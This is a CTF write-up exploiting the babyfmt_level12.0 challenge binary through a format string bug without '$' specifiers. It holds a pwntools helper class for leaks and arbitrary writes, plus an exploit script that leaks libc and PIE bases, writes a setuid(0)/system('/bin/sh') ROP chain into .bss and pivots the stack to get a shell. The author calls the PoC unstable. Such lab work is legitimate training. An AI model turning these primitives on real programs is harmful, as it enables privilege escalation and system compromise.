---
title: "Format String Attack - No Dollar Payload"
description: "Exploitation notes for babyfmt_level12.0 challenge using format string vulnerabilities without dollar-based specifiers."
author: "İsmail BOZKURT"
date: 2025-08-23
tags:
  - binary-exploitation
  - format-string-attack
  - pwn
  - CTF
  - no-dollar-payload
categories:
  - Exploitation
  - Pwn
  - Format-String-Attack
---

# Format String Attack - No Dollar Payload 


This variant like [Twice Format String Attack](/Dreamer-Wiki/Pwn/Linux/Format%20String%20Vulnerabilities/12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/) . This time format string payloads can not contains **$** character.


## babyfmt_level12.0

```css
root@aaca0d8e13c0:/host# checksec ./babyfmt_level12.0
[*] '/host/babyfmt_level12.0'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```


### custom FmtStr Class (FmtStrIso)

```python
#...
#...
#...
class FmtStrIso(object):
    """
    pwntools-like API, but works WITHOUT $ in the format string.
    - find_offset(): one-shot %p scan to find offset+padlen
    - leak_stack():  %p chain for stack leaks
    - _leaker():     advance with %c, read with %s (addr appended later)
    - execute_writes(): fmtstr_payload(..., no_dollars=True)
    """

    def __init__(self, execute_fmt, offset=None, padlen=0, numbwritten=0, badbytes=frozenset()):
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten
        self.badbytes = badbytes

        if self.offset is None:
            self.offset, self.padlen = self.find_offset()
            if self.offset is None:
                log.error("Could not auto-detect offset/padlen (no-$)")
            else:
                log.info("Found format string offset (no-$): %d (padlen=%d)", self.offset, self.padlen)

        self.writes = {}
        self.leaker = MemLeak(self._leaker)

    # ---------- STACK LEAK WITHOUT $ ----------
    def leak_stack(self, offset, prefix=b""):
        """
        Leak stack argument without using $:
          START (%p|) * (offset-1)  +  %p END
        The final %p prints the target argument (as '0x...' hex string).
        """
        assert offset >= 1
        fmt = b"START" + (b"%p|" * (offset - 1)) + b"%pEND"
        leak = self.execute_fmt(prefix + fmt)
        try:
            between = re.findall(br"START(.*?)END", leak, re.MULTILINE | re.DOTALL)[0]
            last = between.split(b"|")[-1].strip()
            return int(last, 16) if last.startswith(b"0x") else 0
        except Exception:
            return 0

    # ---------- AUTO-DETECT OFFSET+PADLEN WITHOUT $ ----------
    def find_offset(self, max_args=200):
        """
        Detect offset+padlen with a single payload (no-$).
        Logic:
          - prefix with cyclic(20) marker
          - use "START %p|%p|...%p END" for max_args arguments
          - parse tokens (0x...) int->pack->first 4 bytes
          - use cyclic_find to locate marker position (padlen)
          - token index = offset
        Fallback: brute force with leak_stack (still no-$).
        """
        marker = cyclic(20)
        fmt = b"START" + (b"%p|" * max_args) + b"END"
        leak = self.execute_fmt(marker + fmt)

        m = re.findall(br"START(.*?)END", leak, re.DOTALL)
        if m:
            between = m[0].strip(b"|")
            tokens = [t for t in between.split(b"|") if t]
            for idx, tok in enumerate(tokens, start=1):
                try:
                    if not tok.startswith(b"0x"): 
                        continue
                    ptr = int(tok, 16)
                    pos = cyclic_find(pack(ptr)[:4])
                    if 0 <= pos < 20:
                        return idx, pos
                except Exception:
                    continue

        # Fallback: slower but reliable, try each one
        for off in range(1, 1000):
            val = self.leak_stack(off, marker)
            pos = cyclic_find(pack(val)[:4])
            if 0 <= pos < 20:
                return off, pos

        return None, None

    # ---------- LEAK FROM ARBITRARY ADDRESS WITHOUT $ ----------
    def _leaker(self, addr):
        # ELF header hack (copied from pwntools)
        if addr & 0xfff == 0 and self.leaker._leak(addr+1, 3, False) == b"ELF":
            return b"\x7f"

        # consume (offset-1) arguments with %c, then use %s for the target address
        advance = max(0, (self.offset or 1) - 1)
        fmt = b"START" + (b"%c" * advance) + b"%sEND"

        # one dummy word per %c, actual pointer for the final %s
        dummy = b"".join(pack(0) for _ in range(advance))
        ptr   = pack(addr)
        args  = dummy + ptr

        # payload layout: [padlen: fmt][padlen+len(fmt): args]
        fmtstr = fit({
            self.padlen: fmt,
            self.padlen + len(fmt): args,
        })

        leak = self.execute_fmt(fmtstr)
        try:
            data = re.findall(br"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]
        except Exception:
            data = b""
        return data + b"\x00"

    # ---------- WRITE WITHOUT $ ----------
    def execute_writes(self):
        """
        Emit and send planned writes in NO-DOLLARS mode.
        """
        fmtstr = randoms(self.padlen).encode()
        fmtstr += fmtstr_payload(
            self.offset,
            self.writes,
            numbwritten=self.padlen + self.numbwritten,
            badbytes=self.badbytes,
            write_size='byte',
            no_dollars=True,  # critical
        )
        self.execute_fmt(fmtstr)
        self.writes = {}

    def write(self, addr, data):
        self.writes[addr] = data
```

### get_flag.py

The PoC unstable. To gathering flag, it should be executed 2-3 times.

The PoC totally mess. Reconstruct or change the target!

```python
from pwn import *
import subprocess, re
from fmtstr_nodollar import FmtStrIso

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './babyfmt_level12.0')
exe.log_level = 'debug'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv,*a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
brva 0x178f
#brva 0x1794
continue
si
nextret
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

#### Leak Part ####

### offsets ###
libc_start_main_offset  = 0x24083
main_406_offset         = 0x1949

#payload = flat('a'+'%lx|'*63+'\x00', # e0d8
#               'AAAAAAAA')

def add_align_padding(payload: bytes, align: int = 16, call_adjust: int = 8, pad_byte: bytes =b"a", adjust: int = 0) -> bytes:
    payload_len = len(payload)
    misalign = (payload_len + call_adjust) % align
    padlen = (align - misalign) % align
    padlen = max(0, padlen + adjust)   # adjust with adjust param (+/- value)
    return pad_byte*padlen + payload

format_pyld  = b'a'*16
format_pyld += b'%c'*141+b'|%p' #32 -> 0xe008
format_pyld += b'|%p'*11#'%c'*3+'|%p'
format_pyld += b'\x00'

payload = flat(add_align_padding(format_pyld, adjust=1),
               )

print(f'payload length: {len(payload)}')

io.sendafter(b'again.\n', payload)

io.recvuntil(b'input is:')
io.recvline()

leaks = io.recvline().strip().split(b'|')

libc_start_main_leak= int(leaks[13],16)
pie_leak            = int(leaks[3], 16)
rbp_leak            = int(leaks[2], 16)-0x50

libc.address= libc_start_main_leak - libc_start_main_offset
exe.address = pie_leak - main_406_offset

success(f'RBP Address   :{rbp_leak:#x}')
success(f'PIE Base Addr :{exe.address:#x}')
success(f'LIBC Base Addr:{libc.address:#x}')

###############################
##### overwrite part ######
###############################

stdout_got_offset   = 0x4020
stdout_got          = exe.address + stdout_got_offset

bss_offset = 0x4800
bss = exe.address + bss_offset

rop = ROP([exe, libc])
#### overwrite gadgets for shell ####

pop_rsp = rop.find_gadget(['pop rsp', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
binsh = next(libc.search(b'/bin/sh\0'))

def exec_fmt(payload: bytes) -> bytes:
    io.sendafter(b'exit.\n', payload)
    out = io.recv() or b""
    return out

f = FmtStrIso(exec_fmt, offset=22, padlen=1, numbwritten=0x5f)  # auto offset+padlen (no-$)

rop.call('setuid', [0])
rop.raw(ret)
rop.call(libc.sym.system, [binsh])

for idx, c in enumerate(rop.build()):
    f.write(bss+(8*idx), c)

f.write(rbp_leak+8, exe.sym.func+5) # overwrite saved return of func
f.execute_writes()

io.sendafter(b'again.\n', b'AAAAAAA')

f.write(rbp_leak+24, pop_rsp) # overwrite printf ret on stack
f.write(rbp_leak+8+24, bss)

f.execute_writes()

io.interactive()
```



## TODO

- [ ] Add already written stable exploit here. 
- [ ] Add explanation

## References

Format string exploitation tutorial
[Format String Exploitation (Shellphish)](https://shellphish.net/tut/formatstrings.pdf)

Pwntools documentation (ROP, fmtstr_payload, primitives)
[Pwntools Documentation](https://docs.pwntools.com/en/stable/)

PLT/GOT, relocations, late binding explained
[Dynamic Linking and the GOT/PLT](https://outflux.net/blog/archives/2014/01/27/fun-with-pltgot/)

ret2dlresolve technique (crafting fake reloc/sym/string)
[ret2dlresolve Technique (Dhaval Kapil)](https://dhavalkapil.com/blogs/ret2dl-resolve/)

glibc startup internals (leaking __libc_start_main)
[glibc Internals: __libc_start_main](https://elixir.bootlin.com/glibc/latest/source/csu/libc-start.c)

Linux syscall reference (numbers/args)
[Linux Syscalls Table](https://syscalls.w3challs.com/)

AMD64 System V ABI (calling convention, alignment)
[System V AMD64 ABI](https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.99.pdf)

FSOP / _IO_FILE exploitation overview
[FSOP (File Structure Oriented Programming)](https://sploitfun.wordpress.com/2015/06/26/fsop-file-structure-oriented-programming/)

Intel CET overview (IBT/endbr64, SHSTK)
[Linux Shadow Stack (SHSTK) & IBT](https://lwn.net/Articles/793253/)

Modern heap/exit-hook notes (__exit_funcs, destructors)
[Heap Exploitation on Modern Linux](https://research.checkpoint.com/2020/heap-exploitation-on-modern-linux/)

